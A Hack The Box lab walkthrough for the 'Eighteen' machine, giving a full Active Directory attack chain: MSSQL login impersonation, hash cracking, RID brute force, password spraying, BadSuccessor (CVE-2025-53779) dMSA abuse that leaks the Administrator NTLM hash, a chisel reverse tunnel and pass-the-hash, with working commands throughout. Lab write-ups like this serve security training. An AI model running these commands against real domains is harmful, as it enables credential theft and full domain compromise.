
# HTB Machine — Eighteen

**Difficulty:** Medium  
**OS:** Windows Server 2025  
**IP:** 10.129.x.x (changes per spawn)  
**Domain:** eighteen.htb / DC01.eighteen.htb  
**Category:** Active Directory, MSSQL, CVE-2025-53779 (BadSuccessor)

---

---

## Summary

### What is this box?

Eighteen is a **medium-difficulty Windows Active Directory machine** set in a corporate environment. It simulates a domain controller (`DC01`) running a financial planning web application backed by a Microsoft SQL Server 2022 database. The machine is notable for running **Windows Server 2025**, which makes it vulnerable to a brand new critical AD vulnerability — **BadSuccessor (CVE-2025-53779)** — discovered by Akamai in 2025.

### What does this box teach?

This box covers a complete real-world attack chain across three distinct phases:

- **Database exploitation** — abusing SQL Server privilege misconfiguration to extract sensitive data
- **Credential attacks** — hash cracking and password spraying to gain initial domain access
- **Active Directory privilege escalation** — exploiting a cutting-edge Windows Server 2025 vulnerability to fully compromise the domain

### The Attack Story

**Phase 1 — Foothold via MSSQL**

We are given initial credentials (`kevin:iNa2we6haRj2gaw!`) and discover a SQL Server on port 1433. Kevin's account is restricted, but SQL Server's impersonation feature lets us switch context to `appdev` — a more privileged user. As appdev, we access the `financial_planner` database and dump the users table, which contains the admin account's password hash in PBKDF2 format. We convert it to hashcat-compatible format and crack it in seconds: `admin:iloveyou1`.

**Phase 2 — Domain User Access (User Flag)**

With a cracked password in hand, we enumerate every domain account by performing RID brute force through the MSSQL channel — no LDAP needed. We get a full list of domain users and spray `iloveyou1` across all of them via WinRM. The user `adam.scott` reuses this password. We log in with evil-winrm and capture the user flag.

**Phase 3 — Domain Compromise via BadSuccessor (Root Flag)**

As `adam.scott` we discover he has `CreateChild` rights on an Organizational Unit in AD. On a Windows Server 2025 domain controller, this is enough to own the entire domain. We use the BadSuccessor exploit to create a **Delegated Managed Service Account (dMSA)** — a new account type in Server 2025 — and configure it as the "successor" to the Administrator account. We then use impacket's getST tool with the `-dmsa` flag to request a Kerberos ticket for our dMSA. The domain controller, following its credential handoff logic, includes the **Administrator's NTLM hash** in the ticket response as a "previous key". We use this hash in a Pass-the-Hash attack via evil-winrm and log in as Administrator, capturing the root flag.

### Why is BadSuccessor so powerful?

The vulnerability abuses a legitimate Windows Server 2025 feature designed to help organisations migrate service accounts. When a dMSA "succeeds" another account, the DC hands over the predecessor's credentials as part of the transition. The flaw is that **any user with CreateChild on any OU** can trigger this process for any account in the domain — including Domain Admins. `CreateChild` is a low-sensitivity permission that is commonly delegated, making this a trivially exploitable path to full domain compromise on any Server 2025 environment.

### Key Vulnerability Chain

```
Weak SQL privilege model        -> credential extraction
Reused corporate password       -> domain user foothold
Overly permissive OU delegation -> full domain compromise (BadSuccessor)
```

---

## Table of Contents

1. [Credentials & Flags Summary](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#credentials--flags-summary)
2. [Exploit Chain Overview](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#exploit-chain-overview)
3. [Step 1 — Reconnaissance (Nmap)](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#step-1--reconnaissance-nmap)
4. [Step 2 — MSSQL Enumeration & Impersonation](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#step-2--mssql-enumeration--impersonation)
5. [Step 3 — Hash Extraction & Cracking](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#step-3--hash-extraction--cracking)
6. [Step 4 — RID Brute Force & User Enumeration](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#step-4--rid-brute-force--user-enumeration)
7. [Step 5 — WinRM Access (User Flag)](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#step-5--winrm-access-user-flag)
8. [Step 6 — BadSuccessor (CVE-2025-53779)](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#step-6--badsuccessor-cve-2025-53779)
9. [Step 7 — Chisel Tunnel for Kerberos](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#step-7--chisel-tunnel-for-kerberos)
10. [Step 8 — getST & Administrator Hash (Root Flag)](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#step-8--getst--administrator-hash-root-flag)
11. [Key Techniques & Lessons Learned](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#key-techniques--lessons-learned)
12. [Tools Used](https://claude.ai/chat/397afe63-c9e5-4100-84ec-76c211fc8098#tools-used)

---

## Credentials & Flags Summary

|Username|Password / Hash|Source|
|---|---|---|
|kevin|iNa2we6haRj2gaw!|Given (initial creds)|
|appdev|—|MSSQL impersonation target|
|admin|iloveyou1|Cracked from DB hash|
|adam.scott|iloveyou1|WinRM spray|
|Administrator|NTLM: 0b133be956bfaddf9cea56701affddec|BadSuccessor dMSA|

|Flag|Value|
|---|---|
|user.txt|88cfd8[redacted]cf241a0a|
|root.txt|938526[redacted]5488cf8|

---

## Exploit Chain Overview

```
[Given Creds: kevin:iNa2we6haRj2gaw!]
        |
        v
[MSSQL Port 1433]
  - EXECUTE AS LOGIN = 'appdev'    <- privilege escalation inside SQL
  - USE financial_planner
  - SELECT * FROM users            <- get admin's PBKDF2 hash
        |
        v
[Hash Cracking]
  - pbkdf2-to-hashcat.py           <- convert format
  - hashcat -m 10900               <- crack with rockyou.txt
  - Result: admin:iloveyou1
        |
        v
[RID Brute Force via MSSQL]
  - nxc mssql --rid-brute          <- enumerate all domain users
  - Build user list
        |
        v
[WinRM Password Spray]
  - crackmapexec winrm -u users -p 'iloveyou1'
  - adam.scott:iloveyou1 -> Pwn3d!  <- USER FLAG
        |
        v
[BadSuccessor CVE-2025-53779]
  - Upload BadSuccessor.ps1 via evil-winrm
  - Create dMSA with msDS-ManagedAccountPrecededByLink -> Administrator
  - adam.scott granted full access to the dMSA
        |
        v
[Chisel SOCKS Tunnel]
  - Tunnel Kerberos port 88 through victim machine
  - Required because port 88 is not directly accessible
        |
        v
[impacket-getST -dmsa -self]
  - Request S4U2self ticket as nory_dmsa$
  - Previous RC4 key = Administrator's NTLM hash
        |
        v
[evil-winrm -H <NTLM>]
  - Login as Administrator          <- ROOT FLAG
```

---

## Step 1 — Reconnaissance (Nmap)

### What we do

Run a port scan to identify exposed services.

### Commands

```bash
# Add host to /etc/hosts first
echo "10.129.X.X eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts

# Port scan
nmap -p 80,1433,5985 -sV 10.129.X.X
```

### Expected Results

|Port|Service|Version|
|---|---|---|
|80|HTTP|Microsoft IIS 10.0|
|1433|MSSQL|Microsoft SQL Server 2022|
|5985|WinRM|Microsoft HTTPAPI 2.0|

### Why this matters

- **Port 80** — Web app (financial planner) backed by MSSQL
- **Port 1433** — Direct MSSQL access with given credentials
- **Port 5985** — WinRM for remote shell once we have valid creds

### Troubleshooting Note

> If port 1433 shows as **filtered**, try resetting the machine on HTB or switching VPN server region. The machine may spawn with firewall misconfiguration.



---

## Step 2 — MSSQL Enumeration & Impersonation

### What we do

Log in to MSSQL with the given credentials, discover we can't access the `financial_planner` database as `kevin`, then impersonate `appdev` who does have access.

### Why impersonation works

SQL Server allows users to impersonate other logins if explicitly granted. We check this with NetExec's `mssql_priv` module, which reveals `kevin can impersonate: appdev`.

### Commands

**Check impersonation privileges:**

```bash
nxc mssql 10.129.X.X -u kevin -p 'iNa2we6haRj2gaw!' -M mssql_priv --localauth
```

**Connect and impersonate:**

```bash
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.X.X
```

**Inside mssqlclient:**

```sql
-- Check available databases
SELECT name FROM sys.databases;
-- Shows: master, tempdb, model, msdb, financial_planner

-- Impersonate appdev at server level
EXECUTE AS LOGIN = 'appdev';

-- Switch to the restricted database
USE financial_planner;

-- List tables
SELECT name FROM sys.tables;
-- Shows: users, incomes, expenses, allocations, analytics, visits

-- Dump users table
SELECT * FROM users;
```

### What we get

A row with `admin` user and a PBKDF2 hash:

```
pbkdf2:sha256:600000$AMtzte...$0673ad90a0b4afb19d662336...
```



---

## Step 3 — Hash Extraction & Cracking

### What we do

The hash is in Django/Werkzeug PBKDF2 format. Hashcat can't read this directly — we need to convert it to hashcat's format first.

### Why we need the converter

PBKDF2 hashes store the salt and hash in base64, but the raw hash from the DB uses hex encoding. The script converts between these formats.

### pbkdf2-to-hashcat.py

```python
#!/usr/bin/env python3
import base64
import sys

h = ''.join(sys.argv[1:])
taa = h.split(':')[:-1]
start = len(':'.join(taa) + ':')

iterations = h[start:].split('$')[0]
salt = h[start:].split('$')[1]
sha = h[start:].split('$')[2]

salt_base64 = base64.b64encode(salt.encode()).decode()
hash_bytes = bytes.fromhex(sha)
hash_base64 = base64.b64encode(hash_bytes).decode()

print(f'{taa[1]}:{iterations}:{salt_base64}:{hash_base64}')
```

### Commands

```bash
# Convert the hash format
python3 pbkdf2-to-hashcat.py 'pbkdf2:sha256:600000$<salt>$<hash>' > hsh

# Crack with hashcat (mode 10900 = PBKDF2-HMAC-SHA256)
hashcat -m 10900 hsh /usr/share/seclists/Passwords/LeakedDatabases/rockyou.txt

# Show result after cracking
hashcat hsh --show
```

### Result

```
admin:iloveyou1
```



---

## Step 4 — RID Brute Force & User Enumeration

### What we do

Use MSSQL to perform RID brute force against the domain. This works because the SQL Server service account has enough AD permissions to enumerate domain objects via MSSQL's xp_dirtree or authentication.

### Why RID brute force

We need a list of valid domain usernames to spray our cracked password against. RID brute force enumerates all SIDs in the domain by incrementing the RID portion.

### Command

```bash
nxc mssql 10.129.X.X -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --localauth
```

### Key users found

```
EIGHTEEN\jamie.dunn
EIGHTEEN\jane.smith
EIGHTEEN\alice.jones
EIGHTEEN\adam.scott      <- this one works!
EIGHTEEN\bob.brown
EIGHTEEN\carol.white
EIGHTEEN\dave.green
EIGHTEEN\HR
EIGHTEEN\IT
EIGHTEEN\Finance
```


---

## Step 5 — WinRM Access (User Flag)

### What we do

Spray the cracked password `iloveyou1` across all discovered users via WinRM. One account reuses this password.

### Commands

```bash
# Create user list file from rid-brute output
# Save usernames to users.txt (one per line)

# Spray via WinRM
crackmapexec winrm 10.129.X.X -u users.txt -p 'iloveyou1' --continue-on-success
```

### Result

```
adam.scott:iloveyou1  ->  Pwn3d!
```

### Get shell & user flag

```bash
evil-winrm -u adam.scott -p 'iloveyou1' -i 10.129.X.X
```

```powershell
type C:\Users\adam.scott\Desktop\user.txt
```

###  User Flag

```
88cfd[redacted]db02cf241a0a
```


---

## Step 6 — BadSuccessor (CVE-2025-53779)

### What is BadSuccessor?

A critical Active Directory privilege escalation vulnerability discovered by Akamai (2025). It abuses **Delegated Managed Service Accounts (dMSA)** — a new account type introduced in Windows Server 2025.

**The vulnerability:** If you have `CreateChild` rights on any OU, you can create a dMSA and set its `msDS-ManagedAccountPrecededByLink` attribute to point to ANY user (e.g., Administrator). The DC then treats your dMSA as the "successor" of that user, granting it access to the target's credentials.

**Requirements:**

- Windows Server 2025 DC (this box runs Server 2025)
- `CreateChild` rights on any OU (adam.scott has this on `OU=Staff`)

### What we do

1. Upload the BadSuccessor PowerShell module via evil-winrm
2. Create a fake dMSA called `nory_dmsa` that "succeeded" the Administrator account
3. Grant adam.scott full control over the dMSA

### Commands (in evil-winrm)

```powershell
# Upload the BadSuccessor module
upload /home/kali/BadSuccessor.ps1 C:\Users\adam.scott\Documents\BadSuccessor.ps1

# Import the module
import-module C:\Users\adam.scott\Documents\BadSuccessor.ps1

# Create the malicious dMSA
# -Path: OU where we have CreateChild rights
# -Name: name of our fake dMSA
# -DelegatedAdmin: who gets control of it (us)
# -DelegateTarget: whose credentials we want (Administrator)
BadSuccessor -mode exploit `
  -Path "OU=Staff,DC=eighteen,DC=htb" `
  -Name "nory_dmsa" `
  -DelegatedAdmin "adam.scott" `
  -DelegateTarget "Administrator" `
  -domain "eighteen.htb"
```

### Expected output

```
Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb
Successfully created and configured dMSA 'nory_dmsa'
Object adam.scott can now impersonate Administrator
```

### What happened under the hood

The script created an AD object with:

- `objectClass: msDSDelegatedManagedServiceAccount`
- `msDS-ManagedAccountPrecededByLink` → Administrator's DN
- `msDS-GroupMSAMembership` → ACL granting adam.scott full access
- `msDS-DelegatedMSAState: 2` → Active state



### Reference

- Original research: https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory

---

## Step 7 — Chisel Tunnel for Kerberos

### Why we need a tunnel

Kerberos uses **port 88** which is not directly accessible from our Kali machine. We need to tunnel through the victim machine using chisel reverse SOCKS proxy.

### Setup — Kali (attacker)

```bash
# Start chisel server in reverse mode
chisel server -p 8080 --reverse
```

### Setup — Victim (evil-winrm)

```powershell
# Upload chisel (must match version on Kali!)
upload /usr/bin/chisel chisel.exe

# Connect back to our server, expose SOCKS on port 1080
.\chisel.exe client 10.10.14.60:8080 R:1080:socks
```

### Configure proxychains

Edit `/etc/proxychains4.conf` — ensure the ProxyList section has:

```
[ProxyList]
socks5 127.0.0.1 1080
```

### Verify tunnel works

```bash
proxychains nmap -p 88 10.129.X.X
# Should show port 88 open
```



---

## Step 8 — getST & Administrator Hash (Root Flag)

### What we do

Use impacket's `getST` with the `-dmsa` and `-self` flags to request a Kerberos ticket as our dMSA. The DC's response includes the **previous encryption keys** for the dMSA's predecessor (Administrator). This leaks the Administrator's NTLM hash directly.

### Fix time sync (required for Kerberos)

```bash
# Disable NTP auto-sync first, then set time from DC
sudo timedatectl set-ntp false
sudo timedatectl set-time "$(date -d "$(curl -s -I http://10.129.X.X | grep -i '^Date:' | cut -d' ' -f2-)" '+%Y-%m-%d %H:%M:%S')"
```

### Request the ticket

```bash
proxychains impacket-getST eighteen.htb/adam.scott:iloveyou1 \
  -impersonate "nory_dmsa\$" \
  -dc-ip 10.129.X.X \
  -self -dmsa
```

### Output breakdown

```
[*] Getting TGT for user
[*] Impersonating nory_dmsa$
[*] Requesting S4U2self
[*] Current keys:
[*]   EncryptionTypes.aes256_cts_hmac_sha1_96: b5fec614...
[*]   EncryptionTypes.rc4_hmac: 4fe6b91c...
[*] Previous keys:              <-- THIS IS ADMINISTRATOR'S NTLM
[*]   EncryptionTypes.rc4_hmac: 0b133be956bfaddf9cea56701affddec
[*] Saving ticket in nory_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

> **Key insight:** The `Previous keys` section contains the Administrator's RC4/NTLM hash. This is because the dMSA is treated as the "successor" to Administrator — the DC hands over the predecessor's keys as part of the dMSA credential handoff mechanism.

### Get root shell (Pass-the-Hash)

```bash
evil-winrm -u administrator -H 0b133be956bfaddf9cea56701affddec -i 10.129.X.X
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

###  Root Flag

```
9385[redacted]5e5488cf8
```



---

## Key Techniques & Lessons Learned

### 1. MSSQL Impersonation

When a SQL login has `IMPERSONATE` permission on another login, you can fully switch context using `EXECUTE AS LOGIN = 'target'`. This lets you access databases and objects that the original account couldn't reach. Always check with `nxc -M mssql_priv`.

### 2. PBKDF2 Hash Format Conversion

Django/Werkzeug PBKDF2 hashes look like `pbkdf2:sha256:600000$salt$hexhash`. Hashcat mode 10900 needs `sha256:iterations:base64salt:base64hash`. A small Python script handles the conversion.

### 3. RID Brute Force via MSSQL

MSSQL's `xp_dirtree` and authentication mechanisms can be abused to enumerate AD users without LDAP access. NetExec's `--rid-brute` automates this through the MSSQL channel.

### 4. Password Reuse Pattern

A single cracked password (`iloveyou1`) from the web app database reused by a domain user (`adam.scott`) is the pivot from internal app access to domain foothold — extremely common in real environments.

### 5. BadSuccessor (CVE-2025-53779) — dMSA Abuse

**Core mechanic:** dMSAs can designate a predecessor account. When the dMSA requests its Kerberos credentials, the DC includes the predecessor's previous keys in the response. This is by design for migration purposes — but it becomes a critical vulnerability when an unprivileged user can create a dMSA pointing to any account.

**Requirements to exploit:**

- DC must run Windows Server 2025
- Attacker needs `CreateChild` rights on any OU

**Why it's dangerous:** `CreateChild` on an OU is not a highly sensitive permission and is often delegated broadly. Any user with this right can fully compromise the domain on Server 2025 DCs.

### 6. Chisel Reverse SOCKS for Kerberos

Kerberos (port 88) is often not exposed externally. Running a reverse SOCKS proxy through an already-compromised WinRM session lets you tunnel all Kerberos traffic through the victim machine. This is more reliable than sshuttle for Windows targets.

### 7. getST -dmsa -self Flag

The `-dmsa` flag in impacket's getST tells it to perform the dMSA-specific S4U2self flow, which returns the predecessor's credentials. The `-self` flag requests the ticket for the account itself (no service specified). The NTLM hash appears in plaintext in the output — no secretsdump required.

### 8. Clock Skew with Kerberos

Kerberos requires clocks to be within 5 minutes of the DC. Always sync before running Kerberos tools:

```bash
sudo timedatectl set-ntp false
sudo timedatectl set-time "$(date -d "$(curl -s -I http://<DC_IP> | grep -i '^Date:' | cut -d' ' -f2-)" '+%Y-%m-%d %H:%M:%S')"
```

If that fails (NTP locked), use `faketime` prefix on the command instead.

---

## Tools Used

|Tool|Purpose|
|---|---|
|nmap|Port scanning & service detection|
|impacket-mssqlclient|MSSQL interactive shell|
|NetExec (nxc)|MSSQL priv check, RID brute, WinRM spray|
|crackmapexec|WinRM password spray|
|hashcat (-m 10900)|PBKDF2 hash cracking|
|evil-winrm|WinRM interactive shell|
|BadSuccessor.ps1|CVE-2025-53779 dMSA creation|
|chisel|Reverse SOCKS tunnel (port 88 forwarding)|
|proxychains|Route Kerberos traffic through SOCKS|
|impacket-getST|Kerberos ticket request with dMSA flag|

---

## References

- BadSuccessor research: https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory
- BadSuccessor script: https://github.com/akamai/BadSuccessor
- impacket getST dMSA support: https://github.com/fortra/impacket
